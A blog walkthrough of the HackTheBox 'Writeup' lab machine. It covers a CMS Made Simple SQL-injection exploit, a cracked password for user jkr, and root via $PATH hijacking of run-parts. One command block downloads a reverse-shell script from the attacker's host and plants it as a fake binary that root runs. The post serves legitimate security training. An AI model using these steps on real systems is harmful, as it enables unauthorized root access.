---
layout:     post
title:      "HackTheBox: Writeup"
date:       2019-12-10 00:00:00
author:     J
summary:    Stfu and listen
categories: HackTheBox
thumbnail:  cube
tags:
 - OSCP
 - HackTheBox
 - Linux
---


Writeup was just retired today. I found  this to be a pretty good box for learning the concept of Path Hijacking. The inital foothold was pretty easy and beginner friendly, but gaining the root flag will prove a bit more challenging for some. Nevertheless, the concept of Path Hijacking is a very relevant one for aspiring OSCP holders.



![1570840239316](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570840239316.png)



---


## Enumeration



Startiing witth our nmap, the results show 2 ports open: SSH and HTTP on ports 22 and 80 respectively. No vulnerable versions were noted to be in use during this phase.



~~~bash
nmap -sC -sV -p- -oN nmap 10.10.10.138
~~~


![1570845242596](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570845242596.png)



or



~~~bash
# Nmap 7.70 scan initiated Sat Jul  6 06:11:55 2019 as: nmap -sC -sV -p- -oN nmap 10.10.10.138               
Nmap scan report for writeup (10.10.10.138)
Host is up (0.24s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)                                        
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)                                               
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)                                              
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)                                            
80/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                      

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .               
# Nmap done at Sat Jul  6 06:18:26 2019 -- 1 IP address (1 host up) scanned in 391.34 seconds  
~~~


Opening up the webpage in the browser shows a static HTML page stating that the website is still under construction and that it was a mockup of a Hackthebox Writeup blog.



![1570845202562](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570845202562.png)



Gobuster did not seem to work on this site, which suggested there might be some protection mechanisms in place. We could troubleshoot and try to bypass that but it won't be neccessary for this box.



![1570845828840](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570845828840.png)



One of my favourite places to check out, whether a directory listing scan(gobuster, dirb etc) is running in the background or not is to check if `robots.txt` can be found. If it exists, it usually gives an insight of what web directories exist on the machine.



![1570845977522](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570845977522.png)





Accessing `http://10.10.10.138/robots.txt` reveals that a directory named `writeup` exists on the server. 

Going to `http://10.10.10.138/writeup` allows us to access the blog page. Nothing of interest can be found on those pages until we start looking into the source code, where disclosure of the CMS can be found.



![1570846114879](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570846114879.png)



Searching for `CMS Made Simple` turned up a fair number of results on [exploit-db][1]. 



![1570846428759](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570846428759.png)



Quite quickly, we can narrow down which scripts are not applicable to this box.

1. We probably won't need XXS or CSRF (At least not for "Easy" rated boxes)
2. We don't have credentials, so the authenticated RCE codes will not work
3. We don't want to Metasploit, unless we're back against the wall and want a quick win(This is an OSCP mindset we should have, to prevent us from becoming too dependant on Metasploit)
4. Web Server Cache Poisoning? Nawwww
5. We don't know the version number, and Google/Wikipedia isn't of much help in this case, so we cannot eliminate based on version numbers.



For the remainder, we can see what remains:

- Green - We can probably try these first, usually the 'Verified'(checkmark on "V") ones are preferred, but there are none in this case
- Orange - Stuff with "Multiple Vulnerabilities", we may need to read those to see which may be useful
- Orange - Specific modules loaded. We don't know if these are in use or if we can access them.
- Red - Probably not applicable, eliminated



![1570846944629](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570846944629.png)



We try downloading exploit from the [first link][5]. (Right-click "View Raw", Copy Link Location). We can read from its contents that it's a python file, so let's save it as a `.py`.



~~~bash
wget https://www.exploit-db.com/raw/46635 -O 46635.py
~~~



Trying to run it shows instructions how to use it:



![1570847484045](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570847484045.png)


OR

~~~bash
root@kali:~/0x4a/Hackthebox/Writeup# python 46635.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri                                                       
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist                           
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based. 
~~~



~~~bash
python 46635.py -u http://10.10.10.138
# Supplying the above parameter failed, so we can try perhaps to include the /writeup directory as it may not have been able to access the SQL injection parameters from the web root

python 46635.py -u http://10.10.10.138/writeup
~~~



The second one successfully runs, giving us an output. It finds a salt as well, so let's assume it's a salted MD5.



~~~
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
~~~



We could try cracking it, but since it's salted we probably would not have any luck with it. We can search online in various MD5 cracking websites(Actually they're more of rainbow tables), to find them. This hash was found on [MD5Online][2].



![1570848003351](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570848003351.png)



We can assume  that the first part containing gibberish is the salt, and password is `raykayjay9`. Give and take a little. We also know that the username was `jkr`. Now we just have to find somewhere these credentials can be used.



In the initial nmap scan, we found out that SSH was open, so can try it there:



![1570848206920](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570848206920.png)



** It is also noteworthy that there is a login location to the CMS at `http://10.10.10.138/writeup/admin` where you can try logging in(and fail).



---



## Privilege Escalation



### Close your eyes and listen



My usual enumeration script `lse.sh` did not return anything, of interest. No cronjobs, no SUID, no sudo privileges. So it was likely a hidden configuration or a password hidden in a file somewhere. Hackthebox typically does not use Kernel exploits for Root, so we can rule them out.



There was this phrase on the Kali Linux website somewhere:



> The quieter you are, the more you can hear



In some cases, there may be cronjobs or scheduled tasks running  on the server but are not listed when you run your enumeration scripts. These may be because of a lack of permissions. To get around this, we can run [pspy][3].



This part was a little annoying, because  the special event that we can leverage to privilege escalate is only triggered on an SSH login, which doesn't happen all that often on VIP servers.



First, let's upload `pspy` onto the target. We download a precompiled `pspy` binary and host it on our attacking machine using `SimpleHTTPServer` on a port of our choosing. 





![1570848583279](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570848583279.png)







We can then use `wget` to download the file onto the target. Don't forget to `cd` into a directory we can write into. Here is use `/tmp`. Once you have it downloaded, set it to executable with `chmod +x` and execute it.





![1570848822812](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570848822812.png)





A lot of stuff will then come up, and may seem intimidating to some at first,  but don't worry about it. As mentioned, the event we want only triggers when an SSH login is performed.(Probably need to be on a more active server and just snoop on pspy to notice the pattern).



We log in using a separate terminal again, and watch the pspy window:



![1570849227313](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570849227313.png)



We see that commands are run as root(UID=0) when the SSH event is triggered. It first sets a PATH  variable, before running a command `run-parts`.



### What is $PATH and how hijacking works



`$PATH` is an environment variable used in Linux systems as a form of "shortcut" do common directories where binaries(sometimes for commands such as "whoami") can be found. To illustrate this I will use `nmap` as an example. We can always run `nmap` from any directory, but where does our operating system know where to find it?



~~~bash
# where is nmap?
root@kali:~ which nmap
/usr/bin/nmap
# check our $PATH
root@kali:~ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
~~~



In the example above, we can see that `nmap` can be found in `/usr/bin`. In addition, our $PATH variable is `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`.



When we run `nmap`, the operating system checks in the different directories in `$PATH` one by one in a sequential order from left to right. In our example, this is the order in which it will search for `nmap`:



1. /usr/local/sbin
2. /usr/local/bin
3. /usr/sbin
4. /usr/bin <-- nmap is here
5. /sbin
6. /bin



So if for example, some process triggers `nmap` to be run, and we instead want it to perform some other action, we can try to create our own malicious file with the name `nmap`. We can then place it in the directories numbered 1, 2 or 3 above(but only if we have the permissions to write to them!). So when the process runs `nmap`, our fake version will take priority and execute because it comes before the actual one in the list.



### $PATH Hijacking



Interestingly enough, the first first entry in `$PATH` is world-writable, and we know that a command `run-parts` is run as the root user.  So in theory, we can create a fake file named `run-parts` within `/usr/local/sbin` and have it execute in place of the real one whenever a user does an SSH in.



For reference, this was what the $PATH variable was set to as shown by the `pspy` output earlier:



> sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin



![1570849659100](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570849659100.png)





Now that we know we can have our own arbitrary code run as root, we can try to gain a shell. For some reason the 'usual'  one liner command  shown below did not work in gaining our shell.



![1570850385931](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570850385931.png)



So I resorted to using `python pty shells`. It use a very interesting set of scripts by infodox, which can be found [here][4]. These are a set of scripts which spawns a reverse shell from the target to the host. Using the listener script to catch the incoming connection, the resulting shell allows for a fully interactive shell, inclusive of tab autocomplete, history, and such.



We first edit `tcp_pty_backconnect.py` to configure our IP address, and then host the file on our HTTP server using a port of our choosing.



Editing the backconnect file:

![1568724965720](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1568724965720.png)





We then transfer the file to `/tmp` directory(since it's usually world writable) onto the target. After which, we create a file called `run-parts` inside hijacked `$PATH` directory. Finally we set our malicious `run-parts` file as executable.



```bash
# on our attacking machine
python -m SimpleHTTPServer 1234
# on target
cd /tmp
wget 10.10.16.53:1234/tcp_pty_backconnect.py
echo python /tmp/tcp_pty_backconnect.py > /usr/local/sbin/run-parts
chmod +x /usr/local/sbin/run-parts
```



OR



![1570853415374](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570853415374.png)





Then, open a new terminal window/tab and SSH back in with our credentials to trigger the event. If we look at the listener we set up previously, we should get a root shell! Reading the `root.txt` file is possible now.



![1570853559061](https://github.com/Dreamscent/Dreamscent.github.io/raw/master/images/Writeup/1570853559061.png)





[1]:  https://exploit-db.com
[2]: https://www.md5online.org/md5-decrypt.html
[3]: https://github.com/DominicBreuker/pspy
[4]: https://github.com/infodox/python-pty-shells

[5]: https://www.exploit-db.com/exploits/46635

